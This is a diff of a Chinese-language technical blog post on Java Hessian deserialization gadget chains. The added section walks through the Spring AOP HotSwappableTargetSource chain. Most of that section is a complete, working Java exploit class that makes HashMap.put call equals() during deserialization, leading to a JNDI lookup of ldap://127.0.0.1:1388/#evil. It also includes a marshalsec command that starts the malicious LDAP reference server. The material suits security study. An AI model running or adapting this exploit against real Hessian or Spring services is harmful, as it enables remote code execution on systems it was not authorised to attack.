@@ -5,9 +5,8 @@ description: ""
 tags: ["java"]
 category: java
 draft: false
+
 ---
-
-
 
 #### hessian 反序列化
 
@@ -29,13 +28,7 @@ readType() 返回的 type 为 ""
 
 readObject --> map.put(key,value) --> hash(key) --> hashcode(key) 
 
-
-
-CC6链
-
-Rome 链
-
-BadAttributeValueExpException+SwingLazyValue
+入口方法为 `hashCode()`、`equals()` 或 `compareTo()`。
 
 
 
@@ -345,4 +338,134 @@ public class rome_jdbc {
 
 
 ##### hessian spring aop 链
+
+```
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:7777/#evil 1388
+```
+
+hessian 反序列化还原对象时调用了 HashMap 的 put 方法，putval, 如果 当前 put 的 key 和已经在 map 内的 key hash一致，且 Key1 != key2 ,key2 不为 null ,则会调用 key2.equals() 
+
+那后面就可以接 HotSwappableTargetSource 链子，
+
+```java
+public boolean equals(Object other) {
+    return (this == other || (other instanceof HotSwappableTargetSource &&
+            this.target.equals(((HotSwappableTargetSource) other).target)));
+}
+```
+
+即 key2.target.equals(key1.target)
+
+exp 如下
+
+```java
+import com.caucho.hessian.io.HessianInput;
+import com.caucho.hessian.io.HessianOutput;
+import com.caucho.hessian.io.SerializerFactory;
+import org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor;
+import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
+import org.springframework.aop.target.HotSwappableTargetSource;
+import org.springframework.jndi.support.SimpleJndiBeanFactory;
+import org.springframework.scheduling.annotation.AsyncAnnotationAdvisor;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+
+public class hsts_exp {
+    public static void main(String[] args) throws Exception {
+        HotSwappableTargetSource hsts1 = new HotSwappableTargetSource(1);
+        HotSwappableTargetSource hsts2 = new HotSwappableTargetSource(2);
+
+        Map map = new HashMap();
+        map.put(hsts1,1);
+        map.put(hsts2,2);
+
+        String url = "ldap://127.0.0.1:1388/#evil";
+        SimpleJndiBeanFactory simpleJndiBeanFactory = new SimpleJndiBeanFactory();
+        simpleJndiBeanFactory.setShareableResources(url);
+
+        DefaultBeanFactoryPointcutAdvisor defaultBeanFactoryPointcutAdvisor = new DefaultBeanFactoryPointcutAdvisor();
+        setFieldValue_dir(defaultBeanFactoryPointcutAdvisor,"adviceBeanName",url);
+        setFieldValue_dir(defaultBeanFactoryPointcutAdvisor,"beanFactory",simpleJndiBeanFactory);
+
+        AsyncAnnotationAdvisor asyncAnnotationAdvisor = new AsyncAnnotationAdvisor();
+
+        setFieldValue(hsts1,"target",defaultBeanFactoryPointcutAdvisor);
+        setFieldValue(hsts2,"target",asyncAnnotationAdvisor);
+        String bytes = Hessian_serialize(map);
+        Hessian_unserialize(bytes);
+    }
+    public static String Hessian_serialize(Object object) throws IOException {
+        ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
+        HessianOutput hessianOutput=new HessianOutput(byteArrayOutputStream);
+        SerializerFactory serializerFactory=new SerializerFactory(); //无需继承Serializable也可进行序列化和反序列化
+        serializerFactory.setAllowNonSerializable(true);
+        hessianOutput.setSerializerFactory(serializerFactory);
+        hessianOutput.writeObject(object);
+        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
+    }
+
+    public static void Hessian_unserialize(String obj) throws IOException, ClassNotFoundException {
+        byte[] code= Base64.getDecoder().decode(obj);
+        ByteArrayInputStream byteArrayInputStream=new ByteArrayInputStream(code);
+        HessianInput hessianInput=new HessianInput(byteArrayInputStream);
+        hessianInput.readObject();
+    }
+    public static void setFieldValue(Object obj,String field,Object value) throws IllegalAccessException, NoSuchFieldException {
+        Field f = obj.getClass().getDeclaredField(field);
+        f.setAccessible(true);
+        f.set(obj,value);
+    }
+    public static void setFieldValue_dir(Object obj, String fieldName, Object value) throws Exception {
+        Field field = null;
+        Class<?> clazz = obj.getClass();
+
+        // 沿着继承链向上递归查找目标字段，直到 Object 类
+        while (clazz != Object.class) {
+            try {
+                field = clazz.getDeclaredField(fieldName);
+                break; // 找到目标字段，跳出循环
+            } catch (NoSuchFieldException e) {
+                // 当前类未声明该字段，指针上移至父类
+                clazz = clazz.getSuperclass();
+            }
+        }
+
+        if (field == null) {
+            throw new NoSuchFieldException("Field '" + fieldName + "' not found in class hierarchy of " + obj.getClass().getName());
+        }
+
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+
+    public static <T> T deserialize(byte[] bytes) throws IOException {
+        ByteArrayInputStream bai = new ByteArrayInputStream(bytes);
+        HessianInput input = new HessianInput(bai);
+        Object o = input.readObject();
+        return (T) o;
+    }
+
+    public static <T> byte[] serialize(T o) throws IOException {
+        ByteArrayOutputStream bao = new ByteArrayOutputStream();
+        HessianOutput output = new HessianOutput(bao);
+        output.writeObject(o);
+        System.out.println(bao.toString());
+        return bao.toByteArray();
+    }
+}
+
+```
+
+
+
+调用栈如下
+
+![img](QQ_1776259742499.png)
 
